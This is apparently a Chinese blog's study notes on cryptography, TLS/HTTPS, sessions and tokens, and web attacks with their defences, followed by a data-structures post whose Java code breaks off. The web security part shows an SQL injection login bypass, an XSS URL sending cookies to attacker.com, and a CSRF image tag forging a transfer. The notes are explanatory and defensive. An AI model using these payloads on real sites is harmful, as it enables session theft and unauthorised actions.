Hash Algorithm 2）：SHA-2是一种哈希算法族，包括SHA-256、SHA-512等，分别产生不同长度的哈希值（256bit、512bit等），比SHA-1和MD5更安全，是目前安全的、推荐使用的Hash算法。\nSHA-3（Secure Hash Algorithm 3）：SHA-3是一种新的哈希算法族，包括SHA3-256、SHA3-512等。是安全的。\n\n碰撞攻击碰撞攻击（Collision attack）是一种针对哈希算法的攻击方法，其目标是找到两个不同的输入数据，它们具有相同的哈希值。理论上，一个理想的哈希函数应具有较高的抗碰撞性，即使计算能力非常强大，也应该很难找到具有相同哈希值的两个不同输入。\n然而，在实际中，许多哈希算法（如MD5和SHA-1）已经被证明存在碰撞攻击的漏洞。这些漏洞使攻击者能够在相对较短的时间内找到具有相同哈希值的不同输入，从而破坏哈希算法的安全性。\n碰撞攻击的成功可能导致以下安全问题：\n\n伪造数字签名：如果攻击者能够找到两个具有相同哈希值的不同文档，他们可以使一个文档的有效数字签名适用于另一个文档，从而实现伪造。\n证书颁发伪造：攻击者可以利用碰撞攻击创建具有相同哈希值的伪造证书，从而破坏SSL&#x2F;TLS等安全通信协议的信任基础。\n数据完整性损害：哈希函数通常用于检查数据的完整性，如下载文件的校验。如果攻击者能够创建具有相同哈希值的恶意文件，用户可能会在不知情的情况下下载和使用这些文件。\n\n为了防范碰撞攻击，密码学家和研究人员持续开发新的、更安全的哈希算法。例如，SHA-2和SHA-3系列哈希算法被认为比MD5和SHA-1更抗碰撞攻击。通过使用更安全的哈希算法，可以提高数据完整性、消息认证和数字签名等应用的安全性。\n对称加密算法对称加密算法是密码学中的一种加密方法，它使用相同的密钥（称为秘密密钥）对数据进行加密和解密。由于加密和解密过程共享相同的密钥，这种算法被称为对称加密。对称加密算法通常比非对称加密算法更快，因为它们在计算上相对简单。然而，密钥管理和安全密钥分发可能是对称加密算法面临的挑战。\n以下是一些著名的对称加密算法：\n\nDES（Data Encryption Standard）：DES是一种曾广泛使用的对称加密算法，它使用56位密钥对数据进行加密。安全性低（曾被破解），不建议使用DES进行加密。\n3DES（Triple DES ）：3DES是DES的改进版本，通过对数据应用三次DES加密操作来增加安全性。尽管3DES比DES更安全，但它的加密速度较慢，并且已经有更安全、更高效的替代方案。\nAES（Advanced Encryption Standard）：AES是现代对称加密算法的事实标准，支持128、192和256位密钥长度，安全性高且加密速度快。AES被广泛应用于各种安全场景，如文件加密、安全通信和网络安全等。\nTwofish：Twofish是Blowfish算法的继任者，也是AES算法竞争过程中的一个候选算法。Twofish使用128位的块大小和可变长度的密钥（128、192或256位）。尽管它在安全性和效率方面表现良好，但它没有像AES那样被广泛采用。\n\n对称加密算法在许多密码学应用中都有广泛应用，如保护数据的机密性、安全通信和身份认证等。然而，它们的一个主要局限性是密钥管理和分发。在许多场景中，对称加密算法与非对称加密算法结合使用。在这种混合方法中，非对称加密算法用于安全地交换对称密钥，而对称加密算法则用于实际的数据加密和解密。这种组合利用了非对称加密算法在密钥管理和分发方面安全性高的优势，同时保留了对称加密算法在数据加密和解密方面的高效性。\n非对称密钥算法非对称密钥算法，又称公钥加密算法，是一种加密和解密过程中使用不同密钥的加密方法。在非对称加密算法中，通常有一对密钥，一个是公钥，另一个是私钥。公钥用于加密数据，而私钥用于解密数据。以下是实际中常用的非对称密钥算法：\n\nRSA（Rivest-Shamir-Adleman）算法：RSA 是一种广泛应用的非对称加密算法，由 Ron Rivest、Adi Shamir 和 Leonard Adleman 于 1978 年发明。RSA 算法基于大数因子分解问题，它的安全性依赖于大数分解的困难性。RSA 用于加密、解密和数字签名，应用领域包括网页浏览器、电子邮件、VPN 等。\n\nElGamal 算法：ElGamal 算法由 Taher ElGamal 于 1985 年提出，基于有限域上的离散对数问题。ElGamal 算法主要应用于加密和数字签名，安全性取决于离散对数问题的难度。\n\nECC（Elliptic Curve Cryptography）：椭圆曲线密码学是一种基于椭圆曲线数学理论的非对称加密算法。ECC 相较于 RSA 和 ElGamal 算法具有更高的安全性和更短的密钥长度，因此在资源受限的环境（如物联网设备、智能卡等）中具有优势。ECC 可应用于加密、解密、数字签名和密钥协商等多个场景。\n\nDSA（Digital Signature Algorithm）：DSA 是一种专门用于数字签名的非对称加密算法，由美国国家安全局（NSA）和美国国家标准与技术研究院（NIST）在 1991 年共同开发。DSA 是基于离散对数问题的，与 ElGamal 算法有相似之处。DSA 的安全性取决于离散对数问题的难度。\n\nLattice-based cryptography（格基密码学）：格基密码学是一种基于格数学的非对称加密算法，它具有抵抗量子计算机攻击的潜力。NTRU 和 Learning With Errors（LWE）是目前最知名的格基密码学算法。随着量子计算机的发展，格基密码学可能在未来成为一种重要的密码学工具。\n\n\n数字签名数字签名是一种用于验证数据的完整性和来源的真实性的密码学技术。数字签名的基本原理是将数据（如文件、消息或电子文档）通过某种算法处理，生成一个唯一的签名。这个签名可以证明数据的完整性和发送方的身份。数字签名在许多场景中非常有用，如电子邮件、软件分发、电子合同、在线支付等。数字签名的实现通常依赖于非对称加密技术。\n以下是数字签名的基本过程：\n\n数据散列（Hashing）：首先，将要签名的数据通过哈希算法即散列函数（如 SHA-256）处理，生成一个固定长度的散列值。\n\n签名生成：使用发送方的私钥对散列值进行加密，生成数字签名。这一过程确保了只有发送方才能生成有效的签名，因为私钥是唯一的且不能被推导出来。\n\n附加签名：将数字签名附加到原始数据上，然后将数据和签名一起发送给接收方。\n\n签名验证：接收方首先使用相同的散列函数对收到的数据进行散列处理，得到一个散列值。然后，使用发送方的公钥对附加的数字签名进行解密，得到另一个散列值。接收方比较这两个散列值，如果它们完全相同，则说明数据未被篡改，且发送方的身份得到验证。\n\n\n数字签名的安全性取决于所使用的哈希算法（散列函数）和非对称加密算法的安全性。\n数字证书数字证书通常由一个受信任的第三方证书颁发机构（CA，Certificate Authority）颁发，CA会对证书持有人进行身份验证，并为其颁发数字证书。数字证书中包含了证书持有人的公钥，而私钥通常由证书持有人自己保存，用于进行数字签名和加密通信。\n在数字证书的使用中，客户端和服务器之间的通信过程如下：\n\n服务器将自己的数字证书发送给客户端。\n\n客户端验证证书的真实性和有效性，如果证书是由一个受信任的CA签发的，并且证书中的信息与服务器身份相符，则客户端会信任该证书。\n\n客户端使用证书中包含的公钥对通信数据进行加密，以确保数据的保密性。\n\n服务器使用自己的私钥对加密数据进行解密，并使用自己的私钥对数字签名进行验证，以确保通信数据的完整性和真实性。\n\n\n数字证书在互联网安全中发挥了重要的作用，可以用于保护网站的安全，防止中间人攻击、数据篡改等恶意行为。同时，数字证书也可以用于身份认证、数字签名等场景，确保数字数据的安全性和可信性。\nSSL&#x2F;TLSSSL（安全套接层）和TLS（传输层安全）的关系是发展演进关系。TLS是SSL的更新和改进版本。虽然二者经常一起提及，但目前主要使用的是TLS协议，因为它比SSL更安全、更先进。\nTLS的工作原理：\n\n客户端使用非对称加密与服务器进行通信，实现身份验证并协商对称加密使用的密钥\n采用对称加密算法对信息摘要进行加密\n\n这样，SSL&#x2F;TLS协议在服务器和客户端之间的通信使用了混合加密方案，既能确保密钥的安全分发，又能保证数据加密的高效性\nTLS 握手有哪些步骤？\nTLS 握手是由客户端和服务器交换的一系列数据报或消息。TLS 握手涉及多个步骤，因为客户端和服务器要交换完成握手和进行进一步对话所需的信息。\nTLS 握手中的确切步骤将根据所使用的密钥交换算法的种类和双方支持的密码套件而有所不同。大致如下：\n\n“客户端问候（client hello）” 消息： 客户端通过向服务器发送“问候”消息来开始握手。该消息将包含客户端支持的 TLS 版本，支持的密码套件（密码套件是一组用于建立安全通信连接的算法），以及称为一串称为“客户端随机数（client random）”的随机字节。\n“服务器问候（server hello）”消息： 作为对 client hello 消息的回复，服务器发送一条消息，内含服务器的 SSL 证书（SSL证书是一种数字证书，是由数字证书颁发机构（CA）签发的数字证书的一种 ）、服务器选择的密码套件，以及“服务器随机数（server random）”，即由服务器生成的另一串随机字节。\n身份验证： 客户端使用颁发该证书的证书颁发机构验证服务器的 SSL 证书。此举确认服务器是其声称的身份，且客户端正在与该域的实际所有者进行交互。\n预主密钥（是在SSL&#x2F;TLS握手期间由客户端生成的随机密钥，用于协商会话密钥）： 客户端再发送一串随机字节，即“预主密钥（premaster secret）”。预主密钥是使用公钥公钥（客户端从服务器的 SSL 证书中获得公钥）加密的，只能使用服务器的私钥解密。\n私钥被使用：服务器对预主密钥进行解密。\n生成会话密钥：客户端和服务器均使用客户端随机数、服务器随机数和预主密钥生成会话密钥。双方应得到相同的结果。\n客户端就绪：客户端发送一条“已完成”消息，该消息用会话密钥加密。\n服务器就绪：服务器发送一条“已完成”消息，该消息用会话密钥加密。\n实现安全对称加密：已完成握手，并使用会话密钥继续进行通信。\n\nTLS 握手期间会发生什么？在 TLS 握手过程中，客户端和服务器一同执行以下操作：\n\n指定将要使用的 TLS 版本（如TLS 1.0、1.2、1.3 等）\n决定将要使用哪些密码套件\n通过服务器的公钥和 SSL 证书颁发机构的数字签名来验证服务器的身份\n生成会话密钥，以在握手完成后使用对称加密\n\nHTTPSHTTPS（超文本传输安全协议）是一种用于保护网络通信安全和数据传输完整性的协议。它在HTTP（超文本传输协议）的基础上添加了SSL&#x2F;TLS加密层，为数据传输提供加密、身份验证和完整性保护。\n主要作用\n加密通信：HTTPS通过SSL&#x2F;TLS协议加密数据，确保数据在传输过程中不被未经授权的第三方窃取或篡改。\n身份验证：HTTPS使用数字证书对服务器进行身份验证，防止用户连接到伪造的服务器，降低中间人攻击的风险。\n数据完整性：HTTPS确保数据在传输过程中不会被篡改，从而保证了数据的完整性。\n\n工作原理\n用户在浏览器中输入HTTPS网址并发送请求。\n服务器收到请求后返回其数字证书，包括公钥和证书颁发机构（CA）的签名等信息。\n浏览器验证服务器证书的有效性，包括证书的颁发者、有效期等。\n若验证通过，浏览器使用服务器的公钥加密一个随机生成的会话密钥，并将其发送给服务器。\n服务器使用自己的私钥解密会话密钥，然后使用会话密钥对数据进行加密传输。\n浏览器使用会话密钥对接收到的加密数据进行解密，展示网页内容。\n\nSession、Cookie、TokenSessionSession 是服务器端用来跟踪和维护用户状态的技术。服务器为每个用户创建一个唯一的 Session ID，并将其与用户的会话数据关联。Session ID 通常通过 Cookie、URL 参数或隐藏表单字段的方式传递给客户端。Session 主要用于识别用户身份、存储用户信息等场景。\nHttpSession 对象并不是 HttpServletRequest 自带的，但可以通过 HttpServletRequest 对象的 getSession 方法轻松获取。当调用 request.getSession() 时，如果当前请求没有关联的会话，它会自动为您创建一个新的会话。如果只想在已经存在的会话中获取，而不创建新的会话，可以调用 request.getSession(false)。这样，如果没有关联的会话，它将返回 null。\nCookieCookie 是一种存储在客户端（如浏览器）的小型文本文件，用于保存服务器发送给客户端的信息。服务器可以设置、读取和修改 Cookie 以识别和追踪用户。Cookie 可以存储一些简单的数据，如用户 ID、登录状态等。\nCookie 对象不是 HttpServletRequest 自带的，但可以通过 HttpServletRequest 对象的 getCookies 方法轻松获取。这个方法会返回一个 Cookie 数组，其中包含客户端发送给服务器的所有 Cookie。若客户端没有发送任何 Cookie，这个方法将返回 null。\nSession和Cookie的区别\n存储位置不同：Session 存储在服务器端，依赖于 Cookie 或其他方式传递 Session ID；Cookie 存储在客户端；\n存储的数据类型不同：Session能够存储任意的JAVA对象，Cookie只能存储String类型的对象。\n\nToken定义Token又称“令牌”，Token是服务端生成的一串字符串，用于身份验证，当第一次登录后，服务器生成一个Token并将此Token返回给客户端，以后客户端只需带上这个Token前来请求数据，服务器就可以根据Token信息验证客户端的身份并确定其访问权限。\n引入目的Token（令牌）的引入是为了解决一些基于传统 Session 和 Cookie 机制的安全性和可扩展性问题。Token 的设计思路是为了在客户端和服务器之间建立一种无状态、可靠的身份验证机制。引入 Token 的原因主要包括以下几点：\n\n分布式系统和微服务：在分布式系统和微服务架构中，多个不同的服务器可能需要处理同一个客户端的请求。这种情况下，使用基于服务器的会话管理（如 Session + Cookie）可能导致不一致的状态。Token 提供了一种无状态的解决方案，可以在不同的服务器间共享和验证，从而更适合分布式和微服务环境。\n\n安全性：Token 可以提供更好的安全性。相对于传统的 Cookie 机制，Token 可以降低 CSRF（跨站请求伪造）攻击的风险。此外，Token 可以包含签名或加密，以确保数据的完整性和安全性。例如，JWT（JSON Web Token）就是一种常见的 Token 实现方式，它支持签名和加密。\n\n跨域访问：Token 可以更轻松地支持跨域访问。在基于 Token 的身份验证中，客户端可以将 Token 放在请求头（如 Authorization 头）中，从而避免浏览器的 Cookie 跨域限制。\n\n多设备和多平台支持：Token 可以灵活地应用于不同的客户端设备和平台。由于 Token 可以通过请求头、URL 参数或请求体等多种方式传输，它可以轻松地在 Web、移动设备和桌面应用等多种场景下使用。\n\n易于集成：Token 机制通常易于与第三方服务集成，如 OAuth2 和 OpenID Connect 等身份验证协议。这些协议允许用户使用第三方帐户（如 Google、Facebook 或 GitHub）登录应用，而无需创建新的帐户。\n\n\n总之，Token 引入主要是为了解决传统基于 Session 和 Cookie 的身份验证机制在安全性、可扩展性和跨平台支持方面的挑战。Token 为构建无状态、可扩展且安全的身份验证解决方案提供了一种有效的方法。\nToken 可以降低 CSRF（跨站请求伪造）攻击的风险的原理要达到在使用Token后降低 CSRF攻击风险的目的，可以将Token放到请求头，（如 Authorization 头）中，攻击者在跨站请求中很难修改请求头，并且浏览器不会像处理 Cookie 那样自动将其发送到服务端，需要在编写客户端代码时，手动获取 Token 并将其添加到请求头中，这就阻止了攻击者将 Token 附加到恶意请求中。这种显式发送 Token 的方式有助于降低 CSRF 攻击的风险。\n将 Token 存储在 Cookie 里面并不能降低 CSRF 风险，这样做会使应用面临与传统基于 Cookie 的身份验证相同的 CSRF 攻击风险。\n对于存储在客户端代码的某个存储位置（如 LocalStorage、SessionStorage 或内存，非cookie）的 Token，要求开发者在编写客户端代码时，手动获取 Token 并将其添加到请求头中。例如：\nfetch(&#x27;https://example.com/api/resource&#x27;, &#123;  headers: &#123;    &#x27;Authorization&#x27;: &#x27;Bearer &#x27; + token  &#125;&#125;)\n\nJWTJWT（JSON Web Token）是一种用于身份验证和授权的开放标准（RFC 7519），它定义了一种紧凑、自包含的 Token 结构。JWT 使用 JSON 对象表示一组声明（Claim），并将其进行 Base64Url 编码和签名或加密，以确保数据的完整性和安全性。JWT 由三部分组成：头部（Header）、载荷（Payload）和签名（Signature）。\nToken 和 JWT 的关系是：JWT 是 Token 的一种实现方式。Token 是一种更通用的概念，可以有多种实现方式和数据格式。JWT 是一种具体的 Token 实现，它使用 JSON 对象表示 Token 的内容，并通过 Base64Url 编码和签名或加密来确保数据的完整性和安全性。由于 JWT 的紧凑和自包含特性，它在许多场景下被广泛使用，如身份验证、授权和单点登录（SSO）等。\n\nJSON Web Token（JWT）是一种轻量级的身份验证和授权机制，它使用JSON格式对信息进行编码，以实现安全传输和存储。JWT通常用于Web应用程序中，用于在客户端和服务器之间传递安全的身份认证信息和其他数据。\n\nJWT由三部分组成：头部（Header）、载荷（Payload）和签名（Signature）。头部包含有关令牌类型和加密算法的信息；载荷包含有关用户和其他授权信息的信息；签名用于验证令牌的真实性和完整性。\n\n在使用JWT进行身份验证时，服务器通常会在成功验证用户凭据后生成JWT，然后将其发送给客户端。客户端可以在每次请求时将JWT发送回服务器进行身份验证。服务器会验证JWT的签名，并解码载荷中的信息，以确认用户的身份和其他授权信息。\n\nJWT具有以下优点：\n\n轻量级：JWT使用JSON格式进行编码，可以在客户端和服务器之间轻松传输和存储，而不需要使用复杂的数据格式和协议。\n\n自包含性：JWT包含了所有必要的信息，例如用户身份和其他授权信息，使得在客户端和服务器之间进行身份验证和授权变得非常简单。\n\n可扩展性：JWT的载荷可以包含任意的信息，例如用户ID、角色、权限等信息，以满足不同的应用需求。\n\n安全性：JWT使用签名对令牌进行验证和保护，防止令牌被篡改和伪造。\n\n\n\n总之，JWT是一种简单而安全的身份验证和授权机制，可以用于Web应用程序中，以确保用户身份的安全性和可信性。\n\n\nWeb安全SQL注入SQL注入（SQL Injection）是一种常见的网络安全漏洞，攻击者通过在用户输入中注入恶意的 SQL 代码，从而操纵后端数据库，获取未授权的数据访问、修改数据、执行管理操作甚至执行任意代码。这种攻击方式通常是由于对用户输入的不充分验证和处理导致的。\n以下是一个简单的 SQL 注入攻击示例。假设我们有一个基于用户输入的用户名和密码来验证用户身份的 Web 应用。在不考虑 SQL 注入的情况下，登录查询可能如下：\nSELECT * FROM users WHERE username = &#x27;$username&#x27; AND password = &#x27;$password&#x27;;\n\n在这里，$username 和 $password 是从用户输入中获取的。攻击者可以在用户名或密码字段中输入恶意 SQL 代码，例如在用户名字段中输入：admin&#39; --。这会导致生成以下查询：\nSELECT * FROM users WHERE username = &#x27;admin&#x27; --&#x27; AND password = &#x27;&#x27;;\n\n在这个例子中，-- 是 SQL 中的注释符号，从而使得密码验证部分被注释掉，攻击者可以绕过密码验证，成功登录管理员账户。\n为了防止 SQL 注入攻击，可以采取以下措施：\n\n参数化查询：使用参数化查询（也称为预编译语句或绑定变量）来与数据库交互，而不是直接在 SQL 语句中拼接用户输入。在SQL语句中，变量用?表示，攻击者就无法改变SQL的结构。参数化查询会将用户输入作为参数传递给查询，而不是作为查询的一部分，从而避免 SQL 注入。\n输入验证：对用户输入进行严格的验证，限制允许的字符集和格式。例如，可以限制用户名和密码只包含字母和数字。\n使用存储过程：将 SQL 代码封装在数据库中的存储过程中，并通过参数调用这些过程。这样可以确保 SQL 代码不受用户输入的影响。\n最小权限原则：限制应用程序连接数据库的权限，使其只能访问必要的数据和执行必要的操作，避免使用root等高级权限账户直接连接数据库。这样即使攻击者发起了 SQL 注入攻击，对数据库的潜在破坏也会受到限制。\n数据库错误处理：不要向用户显示详细的数据库错误信息，因为这可能为攻击者提供有关数据库结构和配置的敏感信息。应该将详细的错误信息记录在日志中，并向用户显示简洁的错误消息。\n\n跨站脚本攻击（XSS攻击）跨站脚本攻击（Cross-Site Scripting，简称 XSS）是一种常见的网络安全漏洞，攻击者通过在 Web 应用中注入恶意的脚本（通常为 JavaScript），以受害者身份在其浏览器上执行这些脚本。这种攻击方式通常是由于对用户输入的不充分验证和处理导致的。\nXSS 攻击主要分为三类：\n\n反射型 XSS：恶意脚本通过 URL 参数传递，当用户点击含有恶意链接的网站或邮件时，攻击者的脚本随请求发送到服务器。攻击者可以构造一个恶意链接，将包含恶意脚本的关键词作为 URL 参数传递：\nhttps://example.com/search?search=&lt;script&gt;document.location=&#x27;https://attacker.com/steal?cookie=&#x27;+encodeURIComponent(document.cookie);&lt;/script&gt;\n\n当受害者点击这个恶意链接时，恶意脚本会作为参数发送到服务器，然后服务器将脚本嵌入到响应页面中。最后，当受害者浏览器加载页面时，恶意脚本被执行。在这个例子中，恶意脚本将受害者的 Cookie 信息发送到攻击者控制的网站。\n\n存储型 XSS：恶意脚本被存储在服务器上，当受害者访问包含恶意脚本的页面时，脚本被加载并执行。比如，黑客写下一篇含有恶意代码的博客文章，所有访问该博客文章的用户都会在他们的浏览器中执行这段恶意的代码，就会把恶意的脚本保存到服务端。\n\nDOM 型 XSS：这类攻击不涉及服务器，而是在客户端通过操纵 DOM（文档对象模型）实现。攻击者在 URL 参数或其他输入途径中注入恶意脚本，然后通过客户端 JavaScript 代码将脚本插入到 DOM 中并执行。\n\n\nXSS 攻击可能导致以下危害：\n\n窃取用户敏感信息（如 Cookie、会话令牌等）\n模拟用户行为\n利用受害者的身份执行恶意操作\n向受害者展示虚假信息\n\n为了防止 XSS 攻击，可以采取以下措施：\n\n输入验证：对用户输入进行严格的验证，限制允许的字符集和格式。\n\n输出编码：在将用户输入插入到 HTML 页面中之前，对其进行适当的编码，以防止恶意脚本被解释执行。例如，将尖括号 &lt; 和 &gt; 转换为 HTML 实体 &amp;lt; 和 &amp;gt;。\n\n使用内容安全策略（CSP）：CSP 是一种安全特性，可以限制浏览器加载和执行外部资源（如脚本、样式表等）。通过配置 CSP，可以限制脚本来源、禁止内联脚本执行等，从而降低 XSS 攻击的风险。\n\n使用 HttpOnly Cookie：将敏感信息（如会话令牌）存储在 HttpOnly Cookie 中，这样 JavaScript 无法访问这些 Cookie，即使发生 XSS 攻击，攻击者也无法窃取这些敏感信息。\n\n保持软件更新：及时更新 Web 应用程序及其依赖库，以修复可能存在的安全漏\n\n\n跨站请求伪造攻击（CSRF攻击）跨站请求伪造（Cross-Site Request Forgery，简称 CSRF）是一种网络安全漏洞，攻击者利用受害者的登录状态，在受害者不知情的情况下伪造请求，让受害者执行攻击者指定的操作。这种攻击方式通常利用用户在其他网站的登录状态，以及浏览器自动发送 Cookie 的特性。\n以下是一个简单的 CSRF 攻击示例。假设我们有一个银行网站，用户在登录后可以进行转账操作。转账请求可能如下：\nhttps://bank.example.com/transfer?to=account&amp;amount=100\n\n在这里，to 参数表示收款人账户，amount 参数表示转账金额。正常情况下，用户登录银行网站后，通过填写表单发起转账请求。\n攻击者可以构造一个恶意网站或电子邮件，包含一个自动发起转账请求的图像标签：\n&lt;img src=&quot;https://bank.example.com/transfer?to=attacker_account&amp;amount=1000&quot; width=&quot;0&quot; height=&quot;0&quot; /&gt;\n\n当受害者访问恶意网站或查看恶意邮件时，浏览器会自动加载图像，从而发起转账请求。如果受害者同时处于银行网站的登录状态，由于浏览器会自动发送 Cookie，转账请求会被银行网站视为合法操作并执行。\n为了防止 CSRF 攻击，可以采取以下措施：\n\n使用安全令牌：为每个会话或表单生成一个随机的安全令牌，将其嵌入到表单或请求中。服务器需要验证表单中的令牌与请求信息中（如Session或Cookie）的令牌是否匹配，以确保请求来自合法用户。\n\nSameSite Cookie：将 Cookie 的 SameSite 属性设置为 Strict 或 Lax，以防止跨站请求发送 Cookie。这样，即使攻击者发起 CSRF 攻击，请求也不会附带有效的 Cookie，从而阻止攻击。\n\n验证请求来源：检查请求的来源（如 Referer 和 Origin 头），确保请求来自可信的网站。这可以防止跨站请求，但可能受到某些限制（如代理和浏览器设置）。\n\n双重验证：对于敏感操作（如转账、密码修改等），使用双重验证（如短信验证码、邮件确认等）确保用户确实想要执行该操作。\n\n使用自定义请求头：为 AJAX 请求添加自定义请求头，例如 CSRF-Token，因为跨站请求通常无法修改请求头。在服务器端，验证请求头中的 CSRF-Token 是否有效。\n\n\n点击劫持攻击点击劫持攻击是一种网络安全漏洞，攻击者通过在受害者浏览器中重叠不透明或透明的 Web 页面层，诱导受害者在不知情的情况下点击或与被遮盖的原始页面上的元素进行交互。这种攻击通常利用 HTML 和 CSS 技术实现，并可能导致用户泄露敏感信息或执行不安全操作。\n为了防止点击劫持攻击，可以采取以下措施：\n\nframe busting：通常可以写一段JavaScript代码，以禁止iframe的嵌套，这种方法叫frame busting\nif (top.location != location) &#123;\ttop.location = self.location;&#125;\n\n使用 X-Frame-Options 响应头：frame busting存在被绕过的可能，比较好的方案是使用一个HTTP头，X-Frame-Options，服务器可以发送 X-Frame-Options 响应头来指示浏览器不允许将网站嵌入到 iframe 中。这将阻止攻击者使用 iframe 构建点击劫持攻击。例如，设置 X-Frame-Options: DENY 将完全禁止嵌入。\n\n\n拒绝服务攻击（DDoS 攻击）拒绝服务攻击（Denial of Service, 简称 DoS）是一种网络安全攻击，其目的是让目标系统或网络资源无法正常提供服务。分布式拒绝服务攻击（Distributed Denial of Service, 简称 DDoS）是 DoS 攻击的一种，它利用大量分布在不同位置的攻击者（通常是通过僵尸网络）同时向目标发起攻击，从而更有效地干扰目标系统的正常运行。\nDDoS 攻击有多种类型，主要分为以下三类：\n\n网络层攻击：这类攻击主要针对网络基础设施，例如通过 ICMP 洪水攻击，来消耗目标的网络带宽资源，导致正常用户无法访问。\n防御措施：\n\n增加网络带宽：提升网络带宽可以缓解网络层攻击带来的影响。\n配置防火墙规则：限制 ICMP、UDP 流量，减少恶意流量进入网络。\n采用流量清洗服务：使用第三方 DDoS 防护服务，如 Cloudflare、AWS Shield、Akamai 等，以帮助检测和过滤攻击流量。\n\n\n传输层攻击：这类攻击主要针对目标系统的传输层协议，例如通过 SYN 洪水攻击（发送大量未完成的 TCP 连接请求）、UDP 洪水攻击来消耗目标系统的连接资源，使其无法处理正常用户的连接请求。\n防御措施：\n\n配置防火墙规则：限制 SYN 数据包的速率，防止攻击者发送大量未完成的连接请求；限制 UDP 流量，减少恶意流量进入网络。\n使用 SYN Cookies：在不需要分配额外资源的情况下，对 SYN 数据包进行验证。\n启用连接限制：限制每个 IP 地址可建立的连接数，降低攻击影响。\n\n\n应用层攻击：这类攻击针对目标系统的应用层服务，例如通过 HTTP 洪水攻击（发送大量伪造的 HTTP 请求）来消耗目标系统的计算资源，导致正常用户无法访问。\n防御措施：\n\n启用 Web 应用防火墙（WAF）：监控和过滤应用层恶意请求。\n使用内容分发网络（CDN）：通过分布式服务器缓存和提供网站内容，抵抗应用层攻击。\n限制请求速率：对来自单个 IP 地址的请求速率进行限制，防止攻击者发送大量请求。\n使用负载均衡：在多个服务器之间分配流量，分散攻击负载。\n\n\n\n综合防御措施：\n\n网络分层和隔离：实施分层和隔离策略，限制攻击者对关键资源的访问。\n使用安全配置和补丁：保持系统和软件的安全配置，及时应用安全补丁，以减少潜在的漏洞。\n监控和应急计划：持续监控网络流量和系统性能，制定应急计划以应对 DDoS 攻击。\n\n防火墙和入侵防御系统防火墙主要负责阻止或允许网络流量通过，基于预先定义的规则集来对传入和传出流量进行过滤。防火墙的主要目的是在内部网络和外部网络之间建立安全边界。\n入侵检测系统（IDS）则主要用于监控网络流量，以检测潜在的恶意活动。IDS 会根据特征库、异常行为等来识别攻击行为，主要目的是检测潜在的恶意行为，并在检测到时发出警报。\n防火墙和 IDS 之间的关键区别在于，防火墙主要用于过滤网络流量，而 IDS 主要用于监控网络流量并检测异常行为。\nReferences\n谢希仁. 计算机网络:第五版. 北京: 电子工业出版社, 2008.1.\n特南鲍姆,等. 计算机网络:第五版. 北京: 清华大学出版社. 2012.3.\n吴翰清. 白帽子讲Web安全:纪念版. 北京: 电子工业出版社, 2014.6.\n尼恩,等. Java高并发核心编程:加强版. 卷1, NIO、Netty、Redis、Zookeeper. 北京: 清华大学出版社, 2022.11.\n\n","categories":["IT"],"tags":["计算机网络"]},{"title":"数据结构和算法（更新中）","url":"/2023/07/10/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/","content":"二分法数组或列表使用二分法的使用前提：\n\n有序\n无重复元素\n\n二分法区间的定义一般有两种，一种是左闭右闭即[left, right]，另一种是左闭右开即[left, right)。基于这两种区间的定义分别给出代码写法如下。\n[left, right][left, right]的区间定义，决定了如下两个特点：\n\nleft和right相等是有意义的，所以在while(left&lt;&#x3D;right)中要使用&lt;&#x3D;。\n如果nums[middle]&gt;target，则更新搜索范围的右下标为middle - 1。\n\n代码如下：\npublic int binarySearch(int[] nums, int target) &#123;    int left = 0;    int right = nums.length - 1;    while (left &lt;= right) &#123;        int middle = left + ((right - left) &gt;&gt; 1);        if (nums[middle] &gt; target) &#123;            //target在[left, middle - 1]范围内            right = middle - 1;        &#125; else if (nums[middle] &lt; target) &#123;            //target在[middle + 1, right]范围内            left = middle + 1;        &#125; else &#123;            //找到了target的下标            return middle;        &#125;    &#125;    //未找到target    return -1;&#125;\n\n[left, right)[left, right)的区间定义，决定了如下两个特点：\n\nleft和right相等是没有意义的，所以在while(left&lt;right)中要使用&lt;。\n如果nums[middle]&gt;target，则更新搜索范围的右下标为middle。\n\n代码如下：\npublic int binarySearch(int[] nums, int target) &#123;    int left = 0;    int right = nums.length;    while (left &lt; right) &#123;        int middle = left + ((right - left) &gt;&gt; 1);        if (nums[middle] &gt; target) &#123;            //target在[left, middle)范围内            right = middle;        &#125; else if (nums[middle] &lt; target) &#123;            //target在[middle + 1, right)范围内            left = middle + 1; //left的[left, right)和[left, right]的更新规则一样        &#125; else &#123;            //找到了target的下标            return middle;        &#125;    &#125;    //未找到target    return -1;&#125;\n\n\n\n双指针法（快慢指针法）双指针法是通过定义一个快&#x2F;前指针和一个慢&#x2F;后指针，在循环中完成指定操作。\n用法示例（力扣27. 移除元素：使用双指针实现移除指定的数组元素，并返回新的数组长度）：\npublic int removeElement(int[] nums, int val) &#123;\tint slow = 0;    for (int fast = 0; fast &lt; nums.length; fast++) &#123;        if (nums[fast] != val) &#123;            //如果快指针指向的元素不是需要删除的元素，就将元素移动到慢指针指向的位置，并移动慢指针            nums[slow++] = nums[fast];        &#125;    &#125;    return slow;&#125;\n\n用法示例（力扣206. 反转链表：在不申请额外内存空间的前提下反转链表）：\npublic ListNode reverseList(ListNode head) &#123;\tListNode pre = null;\tListNode cur = head;\tListNode temp;\twhile (cur != null) &#123;        //保存cur.next的指向，因为接下来要修改cur.next\t\ttemp = cur.next;\t\tcur.next = pre;        //更新pre和cur\t\tpre = cur;\t\tcur = temp;\t&#125;\treturn pre;&#125;\n\n用法示例（力扣142. 环形链表 II：返回链表的入环节点）：\npublic ListNode detectCycle(ListNode head) &#123;\t//本题考察了两个知识点\t//1、判断链表是否有环\t//方法是使用快慢指针，分别以确定的速度前进（快指针每次前进两个节点，慢指针每次前进一个节点），如果有环，那么一定会在环内相遇\tListNode fast = head;\tListNode slow = head;\twhile (fast != null &amp;&amp; fast.next != null) &#123;\t\tfast = fast.next.next;\t\tslow = slow.next;\t\t//如果快慢指针相遇，说明有环\t\tif (slow == fast) &#123;\t\t\t//规则：一个指针从头节点出发，另一个指针从相遇节点出发，这两个指针每次只移动一个节点，那么这两个指针相遇的节点就是环的入口节点\t\t\t//这个规则是通过建立等式推导出的，等式的两端分别是快指针走过的节点数和2×慢指针走过的节点数\t\t\t//最终推导出的式子是x = (n - 1)(y + z) + z，其中x为头节点到环入口节点的节点数，y为环入口节点到相遇节点的节点数，z为相遇节点的到换入口的节点数\t\t\tListNode index1 = slow;\t\t\tListNode index2 = head;\t\t\t//2、如果有环，找到环的入口\t\t\twhile (index1 != index2) &#123;\t\t\t\tindex1 = 